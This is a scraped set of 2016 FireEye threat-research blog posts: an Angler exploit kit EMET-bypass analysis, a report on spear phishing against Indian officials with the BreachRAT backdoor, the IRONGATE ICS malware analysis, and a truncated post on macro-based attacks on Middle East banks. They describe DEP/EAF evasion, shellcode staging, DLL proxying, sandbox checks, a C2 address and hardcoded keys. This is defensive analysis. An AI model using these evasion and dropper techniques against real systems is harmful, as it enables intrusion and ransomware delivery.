  <span class=""type-XS"">Figure 5: VirtualAlloc stub in coreclr.dll,
    helps mitigate DEP without ROP</span></p>
 <p>The Flash exploit uses Flash.ocx’s routines to call VirtualProtect
  for DEP evasion before shellcode is executed, as seen in Figure 6. The
  same routine is then used to jump to shellcode.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: flash.ocx</span></p>
 <p>Since return address validation heuristics are evaded by utilizing
  these inbuilt functions from within ActionScript and Silverlight
  Engine, ROP checks by EMET’s DEP capability are not effective. EMET
  provides other protections, however, which Angler EK is also evading.
  Export Address Table Filtering (EAF) and EAF+ are two capabilities
  that seek to protect the contents of memory and prevent exploit code
  from identifying where things are loaded.</p>
 <p>The following is the working chain of the payload after successfully
  evading DEP mitigations. Note that the APIs will differ for both
  fileless and process oriented infections. However the evasion code was
  found and executed in both the cases successfully evading EMET.</p>
 <p>
  <u>Evasion of EAF in Silverlight Exploit:</u></p>
 <p>As we can see in Figure 7, Silverlight JIT code transfers control to shellcode.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Call Shellcode</span></p>
 <p>After that, the shellcode queries User32 Import Address Table (IAT)
  to pull API addresses, thus evading EAF. We can see the same in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Shellcode reads IAT</span></p>
 <p>The memory address of the GetProcAddress function also gets resolved
  by using IAT of user32.dll. After that, the APIs seen in Figure 9 get
  resolved from GetProcAddress.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: List of APIs</span></p>
 <p>Once the API addresses are resolved, EMET has no validation on API
  calls with regard to where they are coming from, thus resulting in the
  successful execution of the malicious program.</p>
 <p>Note that Silverlight exploits are not subjected to EAF+ because
  “coreclr.dll” and other required dlls are not present in the default
  EMET configuration.</p>
 <p>
  <u>Evasion of EAF+ in Flash exploit:</u></p>
 <ol> <li>Flash uses arbitrary read and write to read memory and finds
    base address of “flash.ocx”.</li> <li>It finds Import Directory
    Table of flash.ocx and loops through ModuleName until it reaches
  “kernel32.dll”.</li> <li>Reads the content of RvaImportLookupTable and
    RvaImportAddressTable, to locate the APIs that will be useful later
    along with VirtualAlloc, which will be used in first stage.</li> </ol>
 <p>After identifying the required addresses, ActionScript code fills
  those values in already existing buffer of shellcode, performs ROPless
  VirtualProtect on the shellcode region to evade the DEP, and then
  transfers the control to the malicious shellcode.</p>
 <p>As we can see in Figure 10, the first stage shellcode will call
  VirtualAlloc and copy the second stage shellcode to that memory,
  transferring the control to that code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Call VirtualAlloc and second stage shellcode</span></p>
 <p>As seen in Figure 11, in the second stage shellcode, the API
  resolution is again based on the IAT reading, which evades EAF.
  Additionally, several calls to GetProcAddress are performed, which go
  completely unscrutinized. As stated before, API calls have no
  validation from EMET with regard to where they are coming from,
  validation is only performed through EAT hardware breakpoints.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Shellcode reads IAT</span></p>
 <p>Afterwards, the exploit shellcode launches the TeslaCrypt process
  under normal exploitation context. In the case of fileless infections,
  the shellcode does not launch anything, but changes the protection
  constant of kernel32!ExitProcess to RWX for 5 bytes, then overwrites
  it with an inline jump to ntdll!RtlExitUserThread. This ensures the
  process stays alive even after closing the tab or closing the Internet
  Explorer window. In either of above cases, the attacker has full
  control over shellcode and it can pretty much execute anything it
  wants without EMET doing anything.</p>
 <p>In Figure 12 and Figure 13, we can see the successful execution of
  TeslaCrypt ransomware with the latest version of EMET installed on the
  system. Please note that we have tested this only on Windows 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: EMET v5.5</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: EMET bypass - Successful execution of
    TeslaCrypt binary</span></p>
 <h5>Conclusion</h5>
 <p>The level of sophistication in exploits kit has increased
  significantly throughout the years. Where obfuscation and new zero
  days were once the only additions in the development cycle, evasive
  code has now been observed being embedded into the framework and shellcode.</p>
 <p>
  <u>Remediation guidance:</u></p>
 <p>Although there are no quick solutions for the DEP, EAF, and EAF+
  evasion techniques, organizations can mitigate this threat through a
  robust vulnerability management program for end user systems, which
  includes the installation of security updates for third party
  software. Applications such as Adobe Flash, web browsers, and Oracle
  Java should be patched routinely, prioritizing critical patches, or
  removed if possible. Because the web browser plays an important role
  in the infection process, disabling browser plugins for Flash or
  Silverlight may also reduce the browser attack surface.</p>",http://www.fireeye.com/blog/threat-research/2016/06/angler_exploit_kite.html
APT Group Sends Spear Phishing Emails to Indian Government Officials,"<p>
  <b>Introduction</b>
  <br /> On May 18, 2016, FireEye Labs observed a suspected
  Pakistan-based APT group sending spear phishing emails to Indian
  government officials. This threat actor has been active for several
  years and conducting suspected intelligence collection operations
  against South Asian political and military targets.</p>
 <p>This group frequently uses a toolset that consists of a downloader
  and modular framework that uses plugins to enhance functionality,
  ranging from keystroke logging to targeting USB devices. We initially
  reported on this threat group and their UPDATESEE malware in our
  FireEye Intelligence Center in February 2016. Proofpoint also
  discussed the threat actors, whom they call <a href=""https://www.proofpoint.com/us/threat-insight/post/Operation-Transparent-Tribe"">Transparent
  Tribe</a>, in a March blog post.</p>
 <p>In this latest incident, the group registered a fake news domain,
  timesofindiaa[.]in, on May 18, 2016, and then used it to send spear
  phishing emails to Indian government officials on the same day. The
  emails referenced the Indian Government’s <a href=""http://zeenews.india.com/business/news/economy/7th-pay-commission-govt-employees-likely-to-get-huge-pay-checks-by-june-july-2016_1880390.html"">7th
    Central Pay Commission (CPC)</a>. These Commissions periodically
  review the pay structure for Indian government and military personnel,
  a topic that would be of interest to government employees.</p>
 <p>
  <b>Malware Delivery Method</b>
  <br /> In all emails sent to these government officials, the actor
  used the same attachment: a malicious Microsoft Word document that
  exploited the <a href=""https://technet.microsoft.com/en-us/library/security/ms12-027.aspx"">CVE-2012-0158
  vulnerability</a> to drop a malicious payload.</p>
 <p>In previous incidents involving this threat actor, we observed them
  using malicious documents hosted on websites about the Indian Army,
  instead of sending these documents directly as an email attachment.</p>
 <p>The email (Figure 1) pretends to be from an employee working at
  Times of India (TOI) and requests the recipient to open the attachment
  associated with the 7th Pay Commission. Only one of the recipient
  email addresses was publicly listed on a website, suggesting that the
  actor harvested the other non-public addressees through other means.</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig1.png"" />
  <b>
    <br /> Figure 1: Contents of the Email</b></p>
 <p>A review of the email header data from the spear phishing messages
  showed that the threat actors sent the emails using the same
  infrastructure they have used in the past.</p>
 <p>
  <b>Exploit Analysis</b>
  <br /> Despite being an older vulnerability, many threat actors
  continue to leverage <a href=""https://technet.microsoft.com/en-us/library/security/ms12-027.aspx"">CVE-2012-0158</a>
  to exploit Microsoft Word. This exploit file made use of the same
  shellcode that we have observed this actor use across a number of
  spear phishing incidents.</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig2.png"" />
  <br /> </p>
 <p style=""text-align: center;"">
  <b>Figure 2: Exploit Shellcode used to Locate and Decode Payload</b></p>
 <p>The shellcode (Figure 2) searches for and decodes the executable
  payload contained in memory between the beginning and ending file
  markers 0xBABABABA and 0xBBBBBBBB, respectively. After decoding is
  complete, the shellcode proceeds to save the executable payload into
  %temp%\svchost.exe and calls WinExec to execute the payload. After the
  payload is launched, the shellcode runs the following commands to
  prevent Microsoft Word from showing a recovery dialog:</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig3.PNG"" /></p>
 <p>Lastly, the shellcode overwrites the malicious file with a decoy
  document related to the Indian defense forces’ pay scale / matrix
  (Figure 3), displays it to the user and terminates the exploited
  instance of Microsoft Word.</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig4.PNG"" />
  <br /> </p>
 <p style=""text-align: center;"">
  <b>Figure 3: Decoy Document related to 7th Pay Commission</b></p>
 <p> </p>
 <p>The decoy document's metadata (Figure 4) suggests that it was
  created fairly recently by the user “Bhopal”.</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig5.png"" />
  <br /> </p>
 <p style=""text-align: center;"">
  <b>Figure 4: Metadata of the Document</b></p>
 <p>The payload is a backdoor that we call the Breach Remote
  Administration Tool (BreachRAT) written in C++. We had not previously
  observed this payload used by these threat actors. The malware name is
  derived from the hardcoded PDB path found in the RAT: C:\Work\Breach
  Remote Administration Tool\Release\Client.pdb. This RAT communicates
  with 5.189.145.248, a command and control (C2) IP address that this
  group has used previously with other malware, including DarkComet and NJRAT.</p>
 <p>The following is a brief summary of the activities performed by the
  dropped payload:</p>
 <p>1. Decrypts resource 1337 using a hard-coded 14-byte key
  &quot;MjEh92jHaZZOl3&quot;. The encryption/decryption routine (refer
  to Figure 5) can be summarized as follows:</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig6.png"" />
  <br /> </p>
 <p style=""text-align: center;"">
  <b>Figure 5: Encryption/ Decryption Function</b></p>
 <ul> <li>Generate an array of integers from 0x00 to 0xff</li>
    <li>Scrambles the state of the table using the given key</li>
    <li>Encrypts or decrypts a string using the scrambled table from
  (b).</li> <li>A python script, which can be used for decrypting this
    resource, is provided in the appendix below.</li> </ul>
 <p>2. The decrypted resource contains the C2 server’s IP address as
  well as the mutex name.</p>
 <p>3. If the mutex does not exist and a Windows Startup Registry key
  with name “System Update” does not exist, the malware performs its
  initialization routine by:</p>
 <ul> <li>Copying itself to the path %PROGRAMDATA%\svchost.exe</li>
    <li>Sets the Windows Startup Registry key with the name “System
    Update” which points to the above dropped payload.</li> </ul>
 <p>4. The malware proceeds to connect to the C2 server at 5.189.145.248
  at regular intervals through the use of TCP over port 10500. Once a
  successful connection is made, the malware tries to fetch a response
  from the server through its custom protocol.</p>
 <p>5. Once data is received, the malware skips over the received bytes
  until the start byte 0x99 is found in the server response. The start
  byte is followed by a DWORD representing the size of the following
  data string.</p>
 <p>6. The data string is encrypted with the above-mentioned encryption
  scheme with the hard-coded key “AjN28AcMaNX”.</p>
 <p>7. The data string can contain various commands sent by the C2
  server. These commands and their string arguments are expected to be
  in Unicode. The following commands are accepted by the malware:</p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/apt-india-gov-fig7.PNG"" /></p>
 <p>
  <b>Conclusion</b>
  <br /> As with previous spear-phishing attacks seen conducted by this
  group, topics related to Indian Government and Military Affairs are
  still being used as the lure theme in these attacks and we observed
  that this group is still actively expanding their toolkit. It comes as
  no surprise that cyber attacks against the Indian government continue,
  given the historically tense relations in the region.</p>
 <p>
  <b>Appendix</b></p>
 <p>
  <b>
    <b>Encryption / Decryption algorithm translated into Python</b></b></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT%20India%20Gov/appendix%20spear%20phishing.png"" /></p>",http://www.fireeye.com/blog/threat-research/2016/06/apt_group_sends_spea.html
"IRONGATE ICS Malware: Nothing to See Here...Masking Malicious Activity
on SCADA Systems","<p>In the latter half of 2015, the FireEye Labs Advanced Reverse
  Engineering (FLARE) team identified several versions of an ICS-focused
  malware crafted to manipulate a specific industrial process running
  within a simulated Siemens control system environment. We named this
  family of malware IRONGATE.</p>
 <p>FLARE found the samples on VirusTotal while researching droppers
  compiled with PyInstaller — an approach used by numerous malicious
  actors. The IRONGATE samples stood out based on their references to
  SCADA and associated functionality. Two samples of the malware payload
  were uploaded by different sources in 2014, but none of the antivirus
  vendors featured on VirusTotal flagged them as malicious.</p>
 <p>Siemens Product Computer Emergency Readiness Team (ProductCERT)
  confirmed that IRONGATE is not viable against operational Siemens
  control systems and determined that IRONGATE does not exploit any
  vulnerabilities in Siemens products. We are unable to associate
  IRONGATE with any campaigns or threat actors. We acknowledge that
  IRONGATE could be a test case, proof of concept, or research activity
  for ICS attack techniques.</p>
 <p>Our analysis finds that IRONGATE invokes ICS attack concepts first
  seen in <a href=""http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/stuxnet_0_5_the_missing_link.pdf"">Stuxnet</a>,
  but in a simulation environment. Because the body of industrial
  control systems (ICS) and supervisory control and data acquisition
  (SCADA) malware is limited, we are sharing details with the broader community.</p>
 <h4>Malicious Concepts</h4>
 <p>
  <b>Deceptive Man-in-the-Middle</b></p>
 <p>IRONGATE's key feature is a man-in-the-middle (MitM) attack against
  process input-output (IO) and process operator software within
  industrial process simulation. The malware replaces a Dynamic Link
  Library (DLL) with a malicious DLL, which then acts as a broker
  between a PLC and the legitimate monitoring software. This malicious
  DLL records five seconds of 'normal' traffic from a PLC to the user
  interface and replays it, while sending different data back to the
  PLC. This could allow an attacker to alter a controlled process
  unbeknownst to process operators.</p>
 <p>
  <b>Sandbox Evasion</b></p>
 <p>IRONGATE's second notable feature involves sandbox evasion. Some
  droppers for the IRONGATE malware would not run if VMware or Cuckoo
  Sandbox environments were employed. The malware uses these techniques
  to avoid detection and resist analysis, and developing these
  anti-sandbox techniques indicates that the author wanted the code to
  resist casual analysis attempts. It also implies that IRONGATE’s
  purpose was malicious, as opposed to a tool written for other
  legitimate purposes.</p>
 <p>
  <b>Dropper Observables</b></p>
 <p>We first identified IRONGATE when investigating droppers compiled
  with PyInstaller — an approach used by numerous malicious actors. In
  addition, strings found in the dropper include the word “payload”,
  which is commonly associated with malware.</p>
 <h4>Unique Features for ICS Malware</h4>
 <p>While IRONGATE malware does not compare to Stuxnet in terms of
  complexity, ability to propagate, or geopolitical implications,
  IRONGATE leverages some of the same features and techniques Stuxtnet
  used to attack centrifuge rotor speeds at the Natanz uranium
  enrichment facility; it also demonstrates new features for ICS malware.</p>
 <ul> <li>Both pieces of malware look for a single, highly specific
  process.</li> <li>Both replace DLLs to achieve process
  manipulation.</li> <li>IRONGATE detects malware detonation/observation
    environments, whereas Stuxnet looked for the presence of antivirus
  software.</li> <li>IRONGATE actively records and plays back process
    data to hide manipulations, whereas Stuxnet did not attempt to hide
    its process manipulation, but suspended normal operation of the
    S7-315 so even if rotor speed had been displayed on the HMI, the
    data would have been <a href=""http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf"">static</a>.</li> </ul>
 <h4>A Proof of Concept</h4>
 <p>IRONGATE’s characteristics lead us to conclude that it is a test,
  proof of concept, or research activity.</p>
 <ul> <li>The code is specifically crafted to look for a user-created
    DLL communicating with the Siemens PLCSIM environment. PLCSIM is
    used to test PLC program functionality prior to in-field deployment.
    The DLLs that IRONGATE seeks and replaces are not part of the
    Siemens standard product set, but communicate with the S7ProSim COM
    object. Malware authors test concepts using commercial simulation
  software.</li> <li>Code in the malicious software closely matched
    usage on a control engineering blog dealing with PLCSIM
    (https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/
    and
  https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/).</li>
    <li>While we have identified and analyzed several droppers for the
    IRONGATE malware, we have yet to identify the code’s infection
  vector.</li> <li>In addition, our analysis did not identify what
    triggers the MitM payload to install; the <span class=""code"">scada.exe </span>binary that deploys the IRONGATE DLL
    payload appears to require manual execution.</li> <li>We have not
    identified any other instances of the ICS-specific IRONGATE
    components (<span class=""code"">scada.exe</span> and <span class=""code"">Step7ProSim.dll</span>), despite their having been
    compiled in September of 2014.</li> <li>Siemens ProductCERT has
    confirmed that the code would not work against a standard Siemens
    control system environment.</li> </ul>
 <h4>Implications for ICS Asset Owners</h4>
 <p>Even though process operators face no increased risk from the
  currently identified members of the IRONGATE malware family, IRONGATE
  provides valuable insight into adversary mindset.</p>
 <p>Network security monitoring, indicator of compromise (IoC) matching,
  and good practice guidance from vendors and other stakeholders
  represent important defensive techniques for ICS networks.</p>
 <p>To specifically counter IRONGATE’s process attack techniques, ICS
  asset owners may, over the longer term, implement solutions that:</p>
 <ul> <li>Require integrity checks and code signing for vendor and user
    generated code. Lacking cryptographic verification facilitates file
    replacement and MitM attacks against controlled industrial
  processes.</li> <li>Develop mechanisms for sanity checking IO data,
    such as independent sensing and backhaul, and comparison with
    expected process state information. Ignorance of expected process
    state facilitates an attacker’s ability to achieve physical
    consequence without alarming operators.</li> </ul>
 <h4>Technical Malware Analysis</h4>
 <h5>IRONGATE Dropper Family</h5>
 <p>FireEye has identified six IRONGATE droppers: <span class=""code"">bla.exe, update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1,</sub> update_no_pipe.exe<sub>2</sub>,
      update_no_pipe.exe<sub>2</sub>,<sub>
  </sub>update.exe<sub>3</sub>.</span> All but one of these Python-based
  droppers first checks for execution in a VMware or Cuckoo Sandbox
  environment. If found, the malware exits.</p>
 <p>If not found, the IRONGATE dropper extracts a UPX-packed, publicly
  available utility (<a href=""http://www.nirsoft.net/utils/netresview.html"">NirSoft
    NetResView version 1.27</a>) to <span class=""code"">audiodg.exe</span> in the same directory as the dropper.
  The dropper then executes the utility using the command <span class=""code"">audiodg.exe /scomma scxrt2.ini.</span> This command
  populates the file <span class=""code"">scxrt2.ini</span> with a
  comma-separated list of network resources identified by the host system.</p>
 <p>The dropper iterates through each entry in <span class=""code"">scxrt2.ini</span>, looking for paths named <span class=""code"">move-to-operational</span> or <span class=""code"">move-to-operational.lnk</span>. If a path is found, the
  dropper first extracts the Base64-encoded .NET executable <span class=""code"">scada.exe </span>to the current directory and then
  moves the file to the path containing<span class=""code"">
  move-to-operational</span> or <span class=""code"">move-to-operational.lnk.</span> The path <span class=""code"">move-to-operational</span> is interesting as well,
  perhaps implying that IRONGATE was not seeking the actual running
  process, but rather a staging area for code promotion. The dropper
  does not execute the <span class=""code"">scada.exe </span>payload after
  moving it.</p>
 <p>
  <b>Anti-Analysis Techniques</b></p>
 <p>Each IRONGATE dropper currently identified deploys the same .NET
  payload, <span class=""code"">scada.exe.</span> All but one of the
  droppers incorporated anti-detection/analysis techniques to identify
  execution in VMware or the Cuckoo Sandbox. If such environments are
  detected, the dropper will not deploy the .NET executable (<span class=""code"">scada.exe</span>) to the host.</p>
 <p>Four of the droppers (<span class=""code"">update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1</sub>,
  update_no_pipe.exe<sub>2</sub>,</span> and <span class=""code"">update.exe<sub>3</sub></span>) detect Cuckoo environments
  by scanning subdirectories of the <span class=""code"" style=""color: rgb(216,36,53);"">%SystemDrive%</span>. Directories with
  names greater than five, but fewer than ten characters are inspected
  for the subdirectories <span class=""code"">drop, files, logs,
  memory,</span> and <span class=""code"">shots.</span> If a matching
  directory is found, the dropper does not attempt to deploy the <span class=""code"">scada.exe</span> payload.</p>
 <p>The <span class=""code"">update.exe<sub>1</sub></span> and <span class=""code"">update.exe<sub>3</sub></span> droppers contain code for
  an additional Cuckoo check using the SysInternals pipelist program,
    <span class=""code"">install.exe</span>, but the code is disabled in each.</p>
 <p>The <span class=""code"">update.exe<sub>2</sub></span> dropper
  includes a check for VMware instead of Cuckoo. The VMWare check looks
  for the registry key <span class=""code"">HKLM\SOFTWARE\VMware,
    Inc.\VMware Tools</span> and the files <span class=""code"">
    <span style=""color: rgb(216,36,53);"">%WINDIR%</span>\system32\drivers\vmmouse.sys</span>
  and <span class=""code"">
    <span style=""color: rgb(216,36,53);"">%WINDIR%</span>\system32\drivers\vmhgfs.sys</span>.
  If any of these are found, the dropper does not attempt to deploy the
    <span class=""code"">scada.exe</span> payload.</p>
 <p>The dropper <span class=""code"">bla.exe</span> does not include an
  environment check for either Cuckoo or VMware.</p>
 <p>
  <b>scada.exe Payload</b></p>
 <p>We surmise that<span class=""code""> scada.exe</span> is a
  user-created payload used for testing the malware. First, our analysis
  did not indicate what triggers <span class=""code"">scada.exe </span>to
  run. Second, Siemens ProductCERT informed us that <span class=""code"">scada.exe</span> is not a default file name associated
  with Siemens industrial control software.</p>
 <p>When <span class=""code"">scada.exe</span> executes, it scans drives
  attached to the system for filenames ending in <span class=""code"">Step7ProSim.dll</span>. According to the Siemens
  ProductCERT, <span class=""code"">Step7ProSim.dll</span> is not part of
  the Siemens PLCSIM software. We were unable to determine whether this
  DLL was created specifically by the malware author, or if it was from
  another source, such as example code or a particular custom ICS
  implementation. We surmise this DLL simulates generation of IO values,
  which would normally be provided by an S7-based controller, since the
  functions it includes appear derived from the Siemens PLCSIM environment.</p>
 <p>If <span class=""code"">scada.exe </span>finds a matching DLL file
  name, it kills all running processes with the name <span class=""code"">biogas.exe</span>. The malware then moves <span class=""code"">Step7ProSim.dll </span>to <span class=""code"">Step7ConMgr.dll </span>and drops a malicious <span class=""code"">Step7ProSim.dll</span> – the IRONGATE payload – to the
  same directory.</p>
 <p>The malicious <span class=""code"">Step7ProSim.dll</span> acts as an
  API proxy between the original user-created <span class=""code"">Step7ProSim.dll </span>(now named <span class=""code"">Step7ConMgr.dll</span>) and the application <span class=""code"">biogas.exe</span> that loads it. Five seconds after
  loading, the malicious <span class=""code"">Step7ProSim.dll
  </span>records five seconds of calls to <span class=""code"">ReadDataBlockValue</span>. All future calls to <span class=""code"">ReadDataBlockValue </span>return the recorded data.</p>
 <p>Simultaneously, the malicious DLL discards all calls to <span class=""code"">WriteDataBlockValue </span>and instead calls <span class=""code"">WriteInputPoint(0x110, 0, 0x7763)</span> and <span class=""code"">WriteInputPoint(0x114, 0, 0x7763)</span> every
  millisecond. All of these functions are named similarly to Siemens
  S7ProSim v5.4 COM interface. It appears that other calls to API
  functions are passed through the malicious DLL to the legitimate DLL
  with no other modification.</p>
 <p>
  <b>Biogas.exe</b></p>
 <p>As mentioned previously, IRONGATE seeks to manipulate code similar
  to that found on a blog dealing with simulating PLC communications
  using PLCSIM, including the use of an executable named <span class=""code"">biogas.exe</span>.</p>
 <p>Examination of the executable from that blog’s demo code shows that
  the <span class=""code"">WriteInputPoint </span>function calls with byte
  indices <span class=""code"">0x110</span> and <span class=""code"">0x114</span> set pressure and temperature values, respectively:</p>
 <p>IRONGATE:</p>
 <p>        <span class=""code""> WriteInputPoint(0x110, 0, 0x7763)<br />
    WriteInputPoint(0x114, 0, 0x7763)</span></p>
 <p> Equivalent pseudo code from Biogas.exe: </p>
 <p>
  <span class=""code"">        S7ProSim.WriteInputPoint(0x110, 0,
    (short)this.Pressure.Value)<br />      
    S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value)</span></p>
 <p>We have been unable to determine the significance of the hardcoded
  value <span class=""code"">0x7763</span>, which is passed in both
  instances of the write function.</p>
 <p>Because of the noted indications that IRONGATE is a proof of
  concept, we cannot conclude IRONGATE’s author intends to manipulate
  specific temperature or pressure values associated with the specific
  biogas.exe process, but find the similarities to this example code striking.</p>
 <h4>Artifacts and Indicators</h4>
 <h5>PyInstaller Artifacts</h5>
 <p>The IRONGATE droppers are Python scripts converted to executables
  using PyInstaller. The compiled droppers contain PyInstaller artifacts
  from the system the executables were created on. These artifacts may
  link other samples compiled on the same system. Five of the six file
  droppers (<span class=""code"">bla.exe, update.exe<sub>1</sub>,
    update_no_pipe.exe<sub>1</sub>, update_no_pipe.exe<sub>2</sub> and
  update.exe<sub>3</sub></span>) all share the same PyInstaller
  artifacts listed in Table 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table1irongate.jpg"" />
  <span class=""type-XS"">Table 1: Pyinstaller Artifacts</span></p>
 <p>The remaining dropper, <span class=""code"">update.exe<sub>2</sub></span>, contains the artifacts
  listed in Table 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table2irongate.jpg"" /></p>
 <p>
  <span class=""type-XS"">Table 2: Pyinstaller Artifacts for update.exe<sub>2</sub></span></p>
 <h5>Unique Strings</h5>
 <p>Figure 1 and 2 list the unique strings discovered in the <span class=""code"">scada.exe</span> and <span class=""code"">Step7ProSim.dll binaries.</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig1irongate.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Scada.exe Unique Strings</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig2irongate.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Step7ProSim.dll Unique Strings</span></p>
 <h5>File Hashes</h5>
 <p>Table 3 contains the MD5 hashes, file and architecture type, and
  compile times for the malware analyzed in this report.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table3irongate.jpg"" />
  <span class=""type-XS"">Table 3: File MD5 Hashes and Compile Times</span></p>
 <p>FireEye detects IRONGATE. A list of indicators can be found <a href=""https://github.com/fireeye/iocs"">here</a>.</p>
 <p>Special thanks to the Siemens ProductCERT for providing support and
  context to this investigation.</p>",http://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html
Targeted Attacks against Banks in the Middle East,"<h5>
  <b>Introduction</b></h5>
 <p>In the first week of May 2016, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/dynamic-threat-intelligence/dti-ati-atiplus-datasheet.html"">FireEye’s
  DTI</a> identified a wave of emails containing malicious attachments
  being sent to multiple banks in the Middle East region. The threat
  actors appear to be performing initial reconnaissance against would-be
  targets, and the attacks caught our attention since they were using
  unique scripts not commonly seen in crimeware campaigns.</p>
 <p>In this blog we discuss in detail the tools, tactics, techniques and
  procedures (TTPs) used in these targeted attacks.</p>
 <h5>
  <b>Delivery Method</b></h5>
 <p>The attackers sent multiple emails containing macro-enabled XLS
  files to employees working in the banking sector in the Middle East.
  The themes of the messages used in the attacks are related to IT
  Infrastructure such as a log of Server Status Report or a list of
  Cisco Iron Port Appliance details. In one case, the content of the
  email appeared to be a legitimate email conversation between several
  employees, even containing contact details of employees from several
  banks. This email was then forwarded to several people, with the
  malicious Excel file attached.</p>
 <h5>
  <b>Macro Details</b></h5>
 <p>The macro first calls an <span class=""code"">Init()</span> function
  (shown in Figure 1) that performs the following malicious activities:</p>
 <ol> <li>Extracts base64-encoded content from the cells within a
    worksheet titled &quot;Incompatible&quot;.</li> <li>Checks for the
    presence of a file at the path <span class=""code"">%PUBLIC%\Libraries\ update.vbs</span>. If the file is
    not present, the macro creates three different directories under
      <span class=""code"">%PUBLIC%\Libraries</span>, namely <span class=""code"">up, dn,</span> and <span class=""code"">tp</span>.</li>
    <li>The extracted content from step one is decoded using PowerShell
    and dropped into two different files: <span class=""code"">%PUBLIC%\Libraries\update.vbs and
  %PUBLIC%\Libraries\dns.ps1</span></li> <li>The macro then creates a
    scheduled task with name: <span class=""code"">GoogleUpdateTaskMachineUI</span>, which executes <span class=""code"">update.vbs</span> every three minutes.</li> </ol>
 <p>Note: Due to the use of a hardcoded environment variable <span class=""code"">%PUBLIC%</span> in the macro code, the macro will only
  run successfully on Windows Vista and subsequent versions of the
  operating system.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Macro Init() subroutine</span></p>
 <h5>
  <b>Run-time Unhiding of Content</b></h5>
 <p>One of the interesting techniques we observed in this attack was the
  display of additional content after the macro executed successfully.
  This was done for the purpose of social engineering – specifically, to
  convince the victim that enabling the macro did in fact result in the
  “unhiding” of additional spreadsheet data.</p>
 <p>Office documents containing malicious macros are commonly used in
  crimeware campaigns. Because default Office settings typically require
  user action in order for macros to run, attackers may convince victims
  to enable risky macro code by telling them that the macro is required
  to view “protected content.”</p>
 <p>In crimeware campaigns, we usually observe that no additional
  content is displayed after enabling the macros. However, in this case,
  attackers took the extra step to actually hide and unhide worksheets
  when the macro is enabled to allay any suspicion. A screenshot of the
  worksheet before and after running the macro is shown in Figure 2 and
  Figure 3, respectively.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure02-before-unhide.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Before unhiding of content</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure03-after-unhiding-content.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: After unhiding of content</span></p>
 <p>In the following code section, we can see that the subroutine <span class=""code"">ShowHideSheets()</span> is called after the <span class=""code"">Init()</span> subroutine executes completely:</p>
 <p>
  <span class=""code"">Private Sub Workbook_Open()<br />      Call Init</span>
